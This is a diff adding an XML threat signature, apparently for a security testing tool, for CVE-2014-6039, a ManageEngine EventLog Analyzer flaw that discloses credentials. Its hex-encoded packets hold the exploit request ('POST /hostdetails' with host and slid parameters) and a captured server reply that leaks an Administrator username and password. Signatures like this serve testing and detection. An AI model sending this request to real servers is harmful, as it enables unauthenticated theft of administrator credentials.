@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="ManageEngine EventLog Analyzer Hostdetails Information Disclosure"/>
+    <EngDesc display="true" value="An information disclosure vulnerability exists in ManageEngine EventLog Analyzer. The vulnerability is due to a failure to restrict access to confidential data in the HostDataServlet servlet. A remote unauthenticated attacker can exploit the vulnerability to disclose administrator credentials. Tester should set variable $destPort to 8400 before test."/>
+    <Intent display="true">
+      <item value="DESIGN_WEAKNESS"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="ManageEngine"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="EventLog_Analyzer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="9.9_build_9002_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20141106-12"/>
+    <CVEID display="true" value="CVE-2014-6039"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="114344"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="107ff65cf10f103454f9067e73944ae8"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635551896676339370"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1419589822" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="A0:D3:C1:F1:4A:7D" destMac="00:50:56:B4:7D:62" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00BA" Identification="F197" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="E6AA" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="49655" destPort="$destPort" SeqNumber="AD4E2AAE" AckNumber="F1A5EE9F" HeaderLength="08" WindowSize="007B" Checksum="A202" UrgentPointer="0000" Options="0101080A75C5DBED01E86A91" Payload="504F5354202F686F737464657461696C7320485454502F312E310D0A486F73743A20646863703231373A383430300D0A436F6E74656E742D547970653A206170706C69636174696F6E2F782D7777772D666F726D2D75726C656E636F6465640D0A436F6E74656E742D4C656E6774683A2031350D0A0D0A736C69643D3426686F737469643D31" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:7D:62" destMac="A0:D3:C1:F1:4A:7D" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0297" Identification="D1C0" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="C4A4" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$destPort" destPort="49655" SeqNumber="F1A5EE9F" AckNumber="AD4E2B34" HeaderLength="08" WindowSize="FA12" Checksum="0AD0" UrgentPointer="0000" Options="0101080A01E86A9275C5DBED" Payload="485454502F312E3120323030204F4B0D0A5365727665723A204170616368652D436F796F74652F312E310D0A436F6E74656E742D547970653A20746578742F786D6C0D0A436F6E74656E742D4C656E6774683A203438330D0A446174653A204D6F6E2C2030312044656320323031342031363A30393A303920474D540D0A0D0A3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D2269736F2D383835392D31223F3E0D0A3C44657461696C733E0D0A202020203C486F73747320646E735F6E616D653D226468637032392E7672742E74656C75732E636F6D2220686F73745F69643D22312220686F73745F6970616464726573733D223137322E31362E382E32392220686F73745F6E616D653D226468637032392E7672742E74656C75732E636F6D223E0D0A20202020202020203C486F737444657461696C7320646F6D61696E5F6E616D653D222220696D6167653D22696D616765732F6C6F676F5F77696E2E67696622206C6173745F6D73675F74696D653D223134313537333237303030303022206C6F675F636F6C6C656374696F6E5F7374617475733D223222206D6F6E5F696E74657276616C3D22313022206E6578745F7363616E5F74696D653D2231343135373332353630353136222070617373776F72643D22566C3966556C46432220736C69643D223422207374617475733D22302220737562747970653D2257696E646F77732053657276657220323030332220747970653D2257696E646F77732220757365726E616D653D2241646D696E6973747261746F72222F3E0D0A202020203C2F486F7374733E0D0A3C2F44657461696C733E0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
